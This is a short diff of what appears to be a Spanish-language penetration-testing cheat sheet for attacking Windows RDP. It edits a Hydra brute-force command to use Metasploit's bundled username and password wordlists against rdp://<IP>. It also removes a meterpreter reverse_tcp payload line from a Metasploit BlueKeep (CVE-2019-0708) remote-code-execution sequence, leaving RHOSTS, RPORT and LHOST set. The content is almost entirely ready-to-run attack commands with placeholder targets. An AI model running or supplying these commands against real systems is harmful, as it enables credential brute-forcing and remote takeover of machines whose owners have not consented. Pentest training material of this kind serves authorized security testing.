@@ -50,7 +50,7 @@ run
 
 Con Hydra:
 ```
-hydra -t 4 -V -f -l <USUARIO> -P <DICCIONARIO> rdp://<IP_OBJETIVO>
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s <Port>
 ```
 
 Con Ncrack:
@@ -70,7 +70,6 @@ Luego:
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 set RHOSTS <IP_OBJETIVO>
 set RPORT 3389
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST <TU_IP>
 run
 ```
